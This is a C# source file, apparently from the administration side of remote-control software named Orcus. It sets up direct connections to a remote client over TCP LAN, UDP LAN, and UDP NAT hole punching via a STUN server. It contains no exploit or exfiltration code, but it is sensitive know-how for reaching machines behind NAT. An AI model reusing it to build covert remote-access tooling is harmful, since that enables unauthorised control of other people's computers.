using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Threading.Tasks;
using Lidgren.Network;
using Orcus.Administration.Commands.ConnectionInitializer.Connections;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.ConnectionInitializer;
using Orcus.Shared.Connection;
using Orcus.Shared.DataTransferProtocol;
using Orcus.Shared.Utilities;
using Command = Orcus.Administration.Plugins.CommandViewPlugin.Command;

namespace Orcus.Administration.Commands.ConnectionInitializer
{
    [ProvideLibrary(PortableLibrary.LidgrenNetwork)]
    public class ConnectionInitializerCommand : Command
    {
        private RemoteConnectionInformation _remoteConnectionInformation;
        private readonly Lazy<IPAddress> _localIpAddress = new Lazy<IPAddress>(NetworkUtilities.GetLanIp);
        private readonly DtpFactory _dtpFactory;

        public ConnectionInitializerCommand()
        {
            _dtpFactory = new DtpFactory(SendDataAction);
        }

        private void SendDataAction(byte[] data)
        {
            ConnectionInfo.UnsafeSendCommand(this, data.Length + 1, writer =>
            {
                writer.Write((byte) ConnectionInitializerCommunication.SendDtpData);
                writer.Write(data);
            });
        }

        [EditorBrowsable(EditorBrowsableState.Never)]
        public override void ResponseReceived(byte[] parameter)
        {
            switch ((ConnectionInitializerCommunication) parameter[0])
            {
                case ConnectionInitializerCommunication.ResponseDtpData:
                    _dtpFactory.Receive(parameter, 1);
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public async Task Initialize(ConnectionProtocol connectionProtocol)
        {
            if (_remoteConnectionInformation == null)
            {
                var result =
                    await Task.Run(
                        () =>
                            _dtpFactory.ExecuteFunction<RemoteConnectionInformation>("GetCoreInformation",
                                connectionProtocol));

                if ((connectionProtocol & (ConnectionProtocol.Tcp | ConnectionProtocol.Udp)) != (ConnectionProtocol.Tcp | ConnectionProtocol.Udp) &&
                    _remoteConnectionInformation != null)
                {
                    if ((connectionProtocol & ConnectionProtocol.Tcp) == ConnectionProtocol.Tcp)
                        result.UdpConnectionInformation = _remoteConnectionInformation.UdpConnectionInformation;
                    //else if((connectionProtocol & ConnectionProtocol.Udp) == ConnectionProtocol.Udp)
                     //   result.Tcp = asdasdasd
                }

                _remoteConnectionInformation = result;
            }
        }

        public async Task<bool> CheckLanConnectionAvailable()
        {
            try
            {
                var macAddress =
                    await
                        Task.Run(
                            () => SendArp.GetDestinationMacAddressBytes(_remoteConnectionInformation.LocalIpAddress, _localIpAddress.Value));

                return new PhysicalAddress(macAddress).Equals(ConnectionInfo.ClientInformation.MacAddress);
            }
            catch (Exception)
            {
                return false;
            }
        }

        public async Task<bool> CheckUdpHolePunchingAvailable()
        {
            if (!_remoteConnectionInformation.UdpConnectionInformation.IsHolePunchingPossible)
                return false;

            return await Task.Run(() =>
            {
                var ipAddress = NetworkUtilities.GetLanIp();
                using (var socket = new Socket(SocketType.Dgram, ProtocolType.Udp))
                {
                    socket.Bind(new IPEndPoint(ipAddress, 3478));

                    IPEndPoint ipEndPoint;

                    if (SessionTraversalUtilitiesForNAT.IsHolePunchingPossible(socket, out ipEndPoint))
                        return true;

                    socket.Close();
                }

                return false;
            });
        } 

        public IConnection InitializeUdpLanConnection(out Guid connectionGuid)
        {
            var config = new NetPeerConfiguration("RemoteDesktop")
            {
                LocalAddress = _localIpAddress.Value,
                MaximumConnections = 1
            };
            config.EnableMessageType(NetIncomingMessageType.UnconnectedData);

            var server = new NetServer(config);
            server.Start();

            server.RegisterReceivedCallback(state =>
            {
                var message2 = server.ReadMessage();
                Debug.Print("Receive message");
            });

            connectionGuid = _dtpFactory.ExecuteFunction<Guid>("InitializeUdpLanConnection",
                (IPEndPoint) server.Socket.LocalEndPoint);



            var message = server.WaitMessage(5*1000);
            if (message?.ReadString() == "GARYFUCKINGWASHINGTON")
            {
                //if (server.WaitMessage(5*1000)?.SenderConnection?.Status == NetConnectionStatus.Connected)
                return new NetServerConnection(server);
            }

            throw new ConnectionException("Unable to receive data from remote client", ConnectionType.UdpLan);
        }

        public IConnection InitializeUdpHolePunchingConnection(out Guid connectionGuid)
        {
            var config = new NetPeerConfiguration("RemoteDesktopUdpHolePunching")
            {
                LocalAddress = _localIpAddress.Value
            };
            config.EnableMessageType(NetIncomingMessageType.NatIntroductionSuccess);

            var netClient = new NetClient(config);
            netClient.InitializeSocket();

            var isBlocking = netClient.Socket.Blocking;
            netClient.Socket.Blocking = true;

            var result = SessionTraversalUtilitiesForNAT.TestStun(SessionTraversalUtilitiesForNAT.GoogleStunServer,
                SessionTraversalUtilitiesForNAT.GoogleStunServerPort, netClient.Socket);
            netClient.Socket.Blocking = isBlocking;

            if (!SessionTraversalUtilitiesForNAT.IsHolePunchingPossible(result.NetType))
                throw new ConnectionException(
                    "STUN server responded with: " + result.NetType + ". Hole punching not possible",
                    ConnectionType.UdpHolePunching);

            netClient.InitializeLoop();

            UdpHolePunchingFeedback holePunchingFeedback;
            try
            {
                holePunchingFeedback = _dtpFactory.ExecuteFunction<UdpHolePunchingFeedback>("InitializeUdpPunchHolingConnection");
            }
            catch (Exception ex)
            {
                throw new ConnectionException("(Client) " + ex.Message, ConnectionType.UdpHolePunching);
            }

            connectionGuid = holePunchingFeedback.ConnectionGuid;

            netClient.NatIntroduction(true, null, holePunchingFeedback.PublicEndPoint, "GARYFUCKINGWASHINGTON");
            _dtpFactory.ExecuteProcedure("ConnectUdpPunchHolingConnection", connectionGuid, result.PublicEndPoint);

            netClient.WaitMessage(int.MaxValue);

            return new ServerConnection();
        }

        public async Task<InitializedConnection> InitializeTcpLanConnection()
        {
            var tcpListener = new TcpListener(_localIpAddress.Value, 0);
            tcpListener.Start();

            var connectTask =
                Task.Run(() => _dtpFactory.ExecuteFunction<Guid>("InitializeTcpLanConnection",
                    (IPEndPoint) tcpListener.LocalEndpoint));

            var acceptTask = tcpListener.AcceptTcpClientAsync();
            if (await Task.WhenAny(acceptTask, Task.Delay(5000)) == acceptTask)
            {
                Guid connectionGuid;
                try
                {
                    connectionGuid = await connectTask;
                }
                catch (Exception)
                {
                    return InitializedConnection.Failed;
                }

                var tcpClient = await acceptTask;

                return new InitializedConnection(new TcpClientConnection(tcpClient), connectionGuid);
            }

            return InitializedConnection.Failed;
        }

        protected override uint GetId()
        {
            return 32;
        }
    }
}